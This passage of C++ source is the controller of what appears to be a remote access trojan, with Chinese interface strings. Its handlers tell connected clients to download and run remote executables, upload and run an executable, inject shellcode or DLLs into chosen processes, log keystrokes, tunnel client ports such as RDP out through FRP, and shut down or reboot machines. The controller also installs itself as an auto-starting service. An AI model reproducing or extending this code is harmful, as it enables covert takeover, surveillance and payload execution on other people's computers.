            auto pubIP = ctx->GetAdditionalData(RES_CLIENT_PUBIP);
            bool flag = strIP == "127.0.0.1" && !pubIP.IsEmpty();
            int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), flag ? pubIP : strIP);
            for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
                auto data = ctx->GetClientData(n);
                n == ONLINELIST_COMPUTER_NAME ?
                m_CList_Online.SetItemText(i, n, m.GetNote()[0] ? m.GetNote() : data) :
                              m_CList_Online.SetItemText(i, n, data.IsEmpty() ? "?" : data);
            }
            m_CList_Online.SetItemData(i, (DWORD_PTR)ctx);
            iCount++;
        }
    }
    CString strStatusMsg;
    strStatusMsg.Format("有%d个主机在线", iCount);
    m_StatusBar.SetPaneText(0, strStatusMsg);
}

void CMy2015RemoteDlg::OnSelchangeGroupTab(NMHDR* pNMHDR, LRESULT* pResult)
{
    int nSel = m_GroupTab.GetCurSel();
    TCHAR szText[256] = {};
    TCITEM item;
    item.mask = TCIF_TEXT;
    item.pszText = szText;
    item.cchTextMax = sizeof(szText) / sizeof(TCHAR);

    if (!m_GroupTab.GetItem(nSel, &item)) {
        return;
    }

    EnterCriticalSection(&m_cs);
    m_selectedGroup = szText;
    LoadListData(szText);
    LeaveCriticalSection(&m_cs);

    *pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineRegroup()
{
    CInputDialog dlg(this);
    dlg.Init("修改分组", "请输入分组名称:");
    if (IDOK != dlg.DoModal()||dlg.m_str.IsEmpty()) {
        return;
    }
    if (dlg.m_str.GetLength() >= 24) {
        MessageBoxA("分组名称长度不得超过24个字符!", "提示", MB_ICONINFORMATION);
        return;
    }
    BYTE cmd[50] = { CMD_SET_GROUP };
    memcpy(cmd + 1, dlg.m_str, dlg.m_str.GetLength());
    SendSelectedCommand(cmd, sizeof(cmd));
}


void CMy2015RemoteDlg::MachineManage(MachineCommand type)
{
    if (MessageBoxA("此操作需客户端具有管理员权限，确定继续吗? ", "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
        EnterCriticalSection(&m_cs);
        POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
        while (Pos) {
            int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
            context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
            BYTE token[32] = { TOKEN_MACHINE_MANAGE, type };
            ContextObject->Send2Client(token, sizeof(token));
        }
        LeaveCriticalSection(&m_cs);
    }
}

void CMy2015RemoteDlg::OnMachineLogout()
{
    MachineManage(MACHINE_LOGOUT);
}


void CMy2015RemoteDlg::OnMachineShutdown()
{
    MachineManage(MACHINE_SHUTDOWN);
}


void CMy2015RemoteDlg::OnMachineReboot()
{
    MachineManage(MACHINE_REBOOT);
}


void CMy2015RemoteDlg::OnExecuteDownload()
{
    CInputDialog dlg(this);
    dlg.Init("下载执行", "远程下载地址:");
    dlg.m_str = "https://127.0.0.1/example.exe";

    if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
        return;

    CString strUrl = dlg.m_str;
    int nUrlLen = strUrl.GetLength();

    int nPacketSize = 1 + nUrlLen + 1;
    BYTE* pPacket = new BYTE[nPacketSize];

    pPacket[0] = COMMAND_DOWN_EXEC;
    memcpy(pPacket + 1, strUrl.GetBuffer(), nUrlLen);
    pPacket[1 + nUrlLen] = '\0';

    SendSelectedCommand(pPacket, nPacketSize);

    delete[] pPacket;
}

void CMy2015RemoteDlg::OnExecuteUpload()
{
    CFileDialog dlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_FILEMUSTEXIST,
                    _T("可执行文件 (*.exe)|*.exe||"), this);

    if (dlg.DoModal() != IDOK)
        return;

    CString strFilePath = dlg.GetPathName();
    CFile file;

    if (!file.Open(strFilePath, CFile::modeRead | CFile::typeBinary)) {
        MessageBox("无法读取文件!\r\n" + strFilePath, "错误", MB_ICONERROR);
        return;
    }

    DWORD dwFileSize = (DWORD)file.GetLength();
    if (dwFileSize == 0 || dwFileSize > 12 * 1024 * 1024) {
        MessageBox("文件为空或超过12MB，无法使用此功能!", "提示", MB_ICONWARNING);
        file.Close();
        return;
    }

    BYTE* pFileData = new BYTE[dwFileSize];
    file.Read(pFileData, dwFileSize);
    file.Close();

    // 命令+大小+内容
    int nPacketSize = 1 + 4 + dwFileSize;
    BYTE* pPacket = new BYTE[nPacketSize];

    pPacket[0] = COMMAND_UPLOAD_EXEC;
    memcpy(pPacket + 1, &dwFileSize, 4);
    memcpy(pPacket + 1 + 4, pFileData, dwFileSize);

    SendSelectedCommand(pPacket, nPacketSize);

    delete[] pFileData;
    delete[] pPacket;
}


void CMy2015RemoteDlg::OnDestroy()
{
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        g_hKeyboardHook = NULL;
    }
    CDialogEx::OnDestroy();
}

CString GetClipboardText()
{
    if (!OpenClipboard(nullptr)) return _T("");

    CString strText;

    // 优先获取 Unicode 格式
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData) {
        wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
        if (pszText) {
#ifdef UNICODE
            strText = pszText;
#else
            // 将 Unicode 转换为多字节（使用系统默认代码页）
            int len = WideCharToMultiByte(CP_ACP, 0, pszText, -1, nullptr, 0, nullptr, nullptr);
            if (len > 0) {
                char* pBuf = strText.GetBuffer(len);
                WideCharToMultiByte(CP_ACP, 0, pszText, -1, pBuf, len, nullptr, nullptr);
                strText.ReleaseBuffer();
            }
#endif
        }
        GlobalUnlock(hData);
    }

    CloseClipboard();
    return strText;
}

void SetClipboardText(const char* utf8Text)
{
    if (!OpenClipboard(nullptr)) return;
    EmptyClipboard();

    // UTF-8 转 Unicode
    int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8Text, -1, nullptr, 0);
    if (wlen > 0) {
        HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, wlen * sizeof(wchar_t));
        if (hGlob) {
            wchar_t* p = static_cast<wchar_t*>(GlobalLock(hGlob));
            if (p) {
                MultiByteToWideChar(CP_UTF8, 0, utf8Text, -1, p, wlen);
                GlobalUnlock(hGlob);
                SetClipboardData(CF_UNICODETEXT, hGlob);
            } else {
                GlobalFree(hGlob);
            }
        }
    }
    CloseClipboard();
}

CDialogBase* CMy2015RemoteDlg::GetRemoteWindow(HWND hWnd)
{
    if (!::IsWindow(hWnd)) return NULL;
    EnterCriticalSection(&m_cs);
    auto find = m_RemoteWnds.find(hWnd);
    auto ret = find == m_RemoteWnds.end() ? NULL : find->second;
    LeaveCriticalSection(&m_cs);
    return ret;
}

CDialogBase* CMy2015RemoteDlg::GetRemoteWindow(CDialogBase *dlg)
{
    EnterCriticalSection(&m_cs);
    for (auto& pair : m_RemoteWnds) {
        if (pair.second == dlg) {
            LeaveCriticalSection(&m_cs);
            return pair.second;
        }
    }
    LeaveCriticalSection(&m_cs);
    return NULL;
}

void CMy2015RemoteDlg::RemoveRemoteWindow(HWND wnd)
{
    EnterCriticalSection(&m_cs);
    m_RemoteWnds.erase(wnd);
    LeaveCriticalSection(&m_cs);
}

LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (g_2015RemoteDlg == NULL)
        return S_OK;

    if (nCode == HC_ACTION) {
        do {
            static CDialogBase* operateWnd = nullptr;
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
			// 先判断是否需要处理的热键
			bool bNeedCheck = false;

			// Win 键 (开始菜单、Win+D/E/R/L 等)
			if (pKey->vkCode == VK_LWIN || pKey->vkCode == VK_RWIN) {
				bNeedCheck = true;
			}
			// Alt+Tab (切换窗口)
			else if (pKey->vkCode == VK_TAB && (pKey->flags & LLKHF_ALTDOWN)) {
				bNeedCheck = true;
			}
			// Alt+Esc (循环切换窗口)
			else if (pKey->vkCode == VK_ESCAPE && (pKey->flags & LLKHF_ALTDOWN)) {
				bNeedCheck = true;
			}
			// Ctrl+Shift+Esc (任务管理器)
			else if (pKey->vkCode == VK_ESCAPE &&
				(GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
				(GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
				bNeedCheck = true;
			}
			// Ctrl+Esc (开始菜单)
			else if (pKey->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
				bNeedCheck = true;
			}
			// F12 (调试器热键)
			else if (pKey->vkCode == VK_F12) {
				bNeedCheck = true;
			}
			// Print Screen (截图)
			else if (pKey->vkCode == VK_SNAPSHOT) {
				bNeedCheck = true;
			}
			// Win+Tab (任务视图)
			else if (pKey->vkCode == VK_TAB &&
				(GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000)) {
				bNeedCheck = true;
			}
			if (bNeedCheck && g_2015RemoteDlg->m_bHookWIN) {
                HWND hFore = ::GetForegroundWindow();
				auto screen = (CScreenSpyDlg*)g_2015RemoteDlg->GetRemoteWindow(hFore);
                if (screen && screen->m_bIsCtrl) {
					MSG msg = { 0 };
					msg.hwnd = hFore;
					msg.message = (UINT)wParam;
					msg.wParam = pKey->vkCode;
					msg.lParam = (pKey->scanCode << 16) | 1;

					if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
						msg.lParam |= (1 << 31) | (1 << 30);
					}

					// 扩展键标志 (bit 24)
					if (pKey->flags & LLKHF_EXTENDED) {
						msg.lParam |= (1 << 24);
					}

					msg.time = pKey->time;
					msg.pt.x = 0;
					msg.pt.y = 0;
                    screen->SendScaledMouseMessage(&msg, false);
					// 返回 1 阻止本地系统处理
					return 1;
                }
			}
            // 只在按下时处理
            if (wParam == WM_KEYDOWN) {
                // 检测 Ctrl+C / Ctrl+X
                if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (pKey->vkCode == 'C' || pKey->vkCode == 'X')) {
                    HWND hFore = ::GetForegroundWindow();
                    operateWnd = g_2015RemoteDlg->GetRemoteWindow(hFore);
                    if (!operateWnd)
                        g_2015RemoteDlg->m_pActiveSession = nullptr;
                }
                // 检测 Ctrl+V
                else if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && pKey->vkCode == 'V') {
                    HWND hFore = ::GetForegroundWindow();
                    CDialogBase* dlg = g_2015RemoteDlg->GetRemoteWindow(hFore);
                    if (dlg) {
                        if (dlg == operateWnd)break;
                        auto screen = (CScreenSpyDlg*)dlg;
                        if (!screen->m_bIsCtrl) {
                            Mprintf("【Ctrl+V】 [本地 -> 远程] 窗口不是控制状态: %s\n", screen->m_IPAddress);
                            break;
                        }
                        // [1] 本地 -> 远程
                        int result;
                        auto files = GetClipboardFiles(result);
                        if (!files.empty()) {
                            // 获取远程目录
							auto str = BuildMultiStringPath(files);
                            BYTE* szBuffer = new BYTE[81 + str.size()];
                            szBuffer[0] = { COMMAND_GET_FOLDER };
                            std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
                            memcpy((char*)szBuffer + 1, masterId.c_str(), masterId.length());
                            memcpy((char*)szBuffer + 1 + masterId.length(), hmac.c_str(), hmac.length());
                            memcpy(szBuffer + 1 + 80, str.data(), str.size());
                            auto md5 = CalcMD5FromBytes((BYTE*)str.data(), str.size());
                            g_2015RemoteDlg->m_CmdList.PutCmd(md5);
                            dlg->m_ContextObject->Send2Client(szBuffer, 81 + str.size());
                            Mprintf("【Ctrl+V】 从本地拷贝文件到远程: %s \n", md5.c_str());
                        } else {
                            CString strText = GetClipboardText();
                            if (!strText.IsEmpty()) {
                                if (strText.GetLength() > 200*1024) {
                                    Mprintf("【Ctrl+V】 从本地拷贝文本到远程失败, 文本太长: %d \n", strText.GetLength());
                                    break;
                                }
                                BYTE* szBuffer = new BYTE[strText.GetLength() + 1];
                                szBuffer[0] = COMMAND_SCREEN_SET_CLIPBOARD;
                                memcpy(szBuffer + 1, strText.GetString(), strText.GetLength());
                                if (dlg->m_ContextObject->Send2Client(szBuffer, strText.GetLength() + 1))
                                    Sleep(100);
                                Mprintf("【Ctrl+V】 从本地拷贝文本到远程 \n");
                                SAFE_DELETE_ARRAY(szBuffer);
                            } else {
                                Mprintf("【Ctrl+V】 本地剪贴板没有文本或文件: %d \n", result);
                            }
                        }
                    } else if (g_2015RemoteDlg->m_pActiveSession && operateWnd) {
                        auto screen = (CScreenSpyDlg*)(g_2015RemoteDlg->m_pActiveSession);
                        if (!screen->m_bIsCtrl) {
                            Mprintf("【Ctrl+V】 [远程 -> 本地] 窗口不是控制状态: %s\n", screen->m_IPAddress);
                            break;
                        }
                        // [2] 远程 -> 本地
                        BYTE	bToken[100] = {COMMAND_SCREEN_GET_CLIPBOARD};
                        std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
                        memcpy((char*)bToken + 1, masterId.c_str(), masterId.length());
                        memcpy((char*)bToken + 1 + masterId.length(), hmac.c_str(), hmac.length());
                        if (::OpenClipboard(nullptr)) {
                            EmptyClipboard();
                            CloseClipboard();
                        }
                        if (g_2015RemoteDlg->m_pActiveSession->m_ContextObject->Send2Client(bToken, sizeof(bToken)))
                            Sleep(200);
                        Mprintf("【Ctrl+V】 从远程拷贝到本地 \n");
                    } else {
                        Mprintf("[Ctrl+V] 没有活动的远程桌面会话 \n");
                    }
                }
            }
        } while (0);
    }

    // 允许消息继续传递
    return CallNextHookEx(g_2015RemoteDlg->g_hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnSessionActivatedMsg(WPARAM wParam, LPARAM lParam)
{
    CDialogBase* pSession = reinterpret_cast<CDialogBase*>(wParam);
    m_pActiveSession = pSession;
    return 0;
}



void CMy2015RemoteDlg::OnToolReloadPlugins()
{
    if (IDYES!=MessageBoxA("请将64位的DLL放于主控程序的 'Plugins' 目录，是否继续?"
                           "\n执行未经测试的代码可能造成程序崩溃。", "提示", MB_ICONINFORMATION | MB_YESNO))
        return;
    char path[_MAX_PATH];
    GetModuleFileNameA(NULL, path, _MAX_PATH);
    GET_FILEPATH(path, "Plugins");
    m_DllList = ReadAllDllFilesWindows(path);
}

context* CMy2015RemoteDlg::FindHostByIP(const std::string& ip)
{
    CString clientIP(ip.c_str());
    EnterCriticalSection(&m_cs);
    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
        context* ContextObject = *i;
        if (ContextObject->GetClientData(ONLINELIST_IP) == clientIP || ContextObject->GetAdditionalData(RES_CLIENT_PUBIP) == clientIP) {
            LeaveCriticalSection(&m_cs);
            return ContextObject;
        }
    }
    LeaveCriticalSection(&m_cs);
    return NULL;
}

LRESULT CMy2015RemoteDlg::InjectShellcode(WPARAM wParam, LPARAM lParam)
{
    std::string* ip = (std::string*)wParam;
    int pid = lParam;
    InjectTinyRunDll(*ip, pid);
    delete ip;
    return S_OK;
}

void CMy2015RemoteDlg::InjectTinyRunDll(const std::string& ip, int pid)
{
    auto ctx = FindHostByIP(ip);
    if (ctx == NULL) {
        MessageBoxA(CString("没有找到在线主机: ") + ip.c_str(), "提示", MB_ICONINFORMATION);
        return;
    }

    auto tinyRun = ReadTinyRunDll(pid);
    Buffer* buf = tinyRun->Data;
    ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
    SAFE_DELETE(tinyRun);
}

LRESULT CMy2015RemoteDlg::AntiBlackScreen(WPARAM wParam, LPARAM lParam)
{
    char* ip = (char*)wParam;
    std::string host(ip);
    std::string arch = ip + 256;
    int pid = lParam;
    auto ctx = FindHostByIP(ip);
    delete ip;
    if (ctx == NULL) {
        MessageBoxA(CString("没有找到在线主机: ") + host.c_str(), "提示", MB_ICONINFORMATION);
        return S_FALSE;
    }
    bool is32Bit = arch == "x86";
    std::string path = PluginPath() + "\\" + (is32Bit ? "AntiBlackScreen_x86.dll" : "AntiBlackScreen_x64.dll");
    auto antiBlackScreen = ReadPluginDll(path, { SHELLCODE, 0, CALLTYPE_DEFAULT, {}, {}, pid, is32Bit });
    if (antiBlackScreen) {
        Buffer* buf = antiBlackScreen->Data;
        ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
        SAFE_DELETE(antiBlackScreen);
    } else
        MessageBoxA(CString("没有反黑屏插件: ") + path.c_str(), "提示", MB_ICONINFORMATION);
    return S_OK;
}


void CMy2015RemoteDlg::OnParamKblogger()
{
    m_settings.EnableKBLogger = !m_settings.EnableKBLogger;
    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
    SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
    THIS_CFG.SetInt("settings", "KeyboardLog", m_settings.EnableKBLogger);
    SendMasterSettings(nullptr);
}


void CMy2015RemoteDlg::OnOnlineInjNotepad()
{
    auto tinyRun = ReadTinyRunDll(0);
    EnterCriticalSection(&m_cs);
    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
    while (Pos) {
        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
        if (!ctx->IsLogin())
            continue;
        Buffer* buf = tinyRun->Data;
        ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
    }
    LeaveCriticalSection(&m_cs);
    SAFE_DELETE(tinyRun);
}


void CMy2015RemoteDlg::OnParamLoginNotify()
{
    m_needNotify = !m_needNotify;
    THIS_CFG.SetInt("settings", "LoginNotify", m_needNotify);
    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
    SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, m_needNotify ? MF_CHECKED : MF_UNCHECKED);
}


void CMy2015RemoteDlg::OnParamEnableLog()
{
    m_settings.EnableLog = !m_settings.EnableLog;
    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
    SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
    THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
    SendMasterSettings(nullptr);
}


bool IsDateGreaterOrEqual(const char* date1, const char* date2)
{
	const char* months[] = {
		"Jan", "Feb", "Mar", "Apr", "May", "Jun",
		"Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
	};

	auto parseDate = [&months](const char* date, int& year, int& month, int& day) {
		char mon[4] = { 0 };
		sscanf(date, "%3s %d %d", mon, &day, &year);
		month = 0;
		for (int i = 0; i < 12; i++) {
			if (strcmp(mon, months[i]) == 0) {
				month = i + 1;
				break;
			}
		}
	};

	int y1, m1, d1, y2, m2, d2;
	parseDate(date1, y1, m1, d1);
	parseDate(date2, y2, m2, d2);

	if (y1 != y2) return y1 >= y2;
	if (m1 != m2) return m1 >= m2;
	return d1 >= d2;
}

std::string GetAuthKey(const char* token, long long timestamp)
{
	char tsStr[32];
	sprintf_s(tsStr, "%lld", timestamp);

	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	std::string result;

	if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
		{
			CryptHashData(hHash, (BYTE*)token, (DWORD)strlen(token), 0);
			CryptHashData(hHash, (BYTE*)tsStr, (DWORD)strlen(tsStr), 0);

			BYTE hash[16];
			DWORD cbHash = sizeof(hash);
			if (CryptGetHashParam(hHash, HP_HASHVAL, hash, &cbHash, 0))
			{
				char hex[33];
				for (int i = 0; i < 16; i++)
					sprintf_s(hex + i * 2, 3, "%02x", hash[i]);
				result = hex;
			}
			CryptDestroyHash(hHash);
		}
		CryptReleaseContext(hProv, 0);
	}

	return result;
}

// 基于FRP将客户端端口代理到主控程序的公网
// 例如代理3389端口，即可通过 mstsc.exe 进行远程访问
void CMy2015RemoteDlg::OnProxyPort()
{
    BOOL useFrp = THIS_CFG.GetInt("frp", "UseFrp", 0);
    std::string pwd = THIS_CFG.GetStr("frp", "token", "");
    std::string ip = THIS_CFG.GetStr("settings", "master", "");
    if (!useFrp || pwd.empty() || ip.empty()) {
        MessageBoxA("需要正确启用FRP反向代理方可使用此功能!", "提示", MB_ICONINFORMATION);
        return;
    }
    CInputDialog dlg(this);
    dlg.Init("代理端口", "请输入客户端端口:");
	if (IDOK != dlg.DoModal() || atoi(dlg.m_str) <= 0 || atoi(dlg.m_str) >= 65536) {
		return;
	}
    uint64_t timestamp = time(nullptr);
    std::string key = GetAuthKey(pwd.c_str(), timestamp);
	int serverPort = THIS_CFG.GetInt("frp", "server_port", 7000);
    int localPort = atoi(dlg.m_str);
	auto frpc = ReadFrpcDll();
    FrpcParam param(key.c_str(), timestamp, ip.c_str(), serverPort, localPort, localPort);
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	BOOL sent = FALSE;
	while (Pos) {
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		context* ctx = (context*)m_CList_Online.GetItemData(iItem);
		if (!ctx->IsLogin())
			continue;
        CString date = ctx->GetClientData(ONLINELIST_VERSION);
		if (IsDateGreaterOrEqual(date, "Dec 22 2025")) {
			Buffer* buf = frpc->Data;
            BYTE cmd[1 + sizeof(DllExecuteInfoNew)] = {0};
            memcpy(cmd, buf->Buf(), 1 + sizeof(DllExecuteInfoNew));
            DllExecuteInfoNew* p = (DllExecuteInfoNew*)(cmd + 1);
            SetParameters(p, (char*)&param, sizeof(param));
			ctx->Send2Client(cmd, 1 + sizeof(DllExecuteInfoNew));
			sent = TRUE;
        }
        else {
            PostMessageA(WM_SHOWNOTIFY, (WPARAM)new CharMsg("版本不支持"), 
                (LPARAM)new CharMsg("客户端版本最低要求: " + CString("Dec 22 2025")));
        }
        break;
	}
	LeaveCriticalSection(&m_cs);
	SAFE_DELETE(frpc);
    if (sent)
        MessageBoxA(CString("请通过") + ip.c_str() + ":" + std::to_string(localPort).c_str() + "访问代理端口!", 
            "提示", MB_ICONINFORMATION);
}


void CMy2015RemoteDlg::OnHookWin()
{
	m_bHookWIN = !m_bHookWIN;
	MessageBoxA(CString("远程控制时，") + (m_bHookWIN ? "" : "不") + CString("转发系统热键到远程桌面。"),
		"提示", MB_ICONINFORMATION);
	THIS_CFG.SetInt("settings", "HookWIN", m_bHookWIN);
	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
	SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
}


void CMy2015RemoteDlg::OnRunasService()
{
    m_runNormal = !m_runNormal;
	MessageBoxA(m_runNormal ? CString("以传统方式启动主控程序，没有守护进程。") : 
        CString("以“服务+代理”形式启动主控程序，会开机自启及被守护。"),
		"提示", MB_ICONINFORMATION);
	THIS_CFG.SetInt("settings", "RunNormal", m_runNormal);
	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
	SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, !m_runNormal ? MF_CHECKED : MF_UNCHECKED);
    BOOL r = m_runNormal ? ServerService_Uninstall() : ServerService_Install();
}
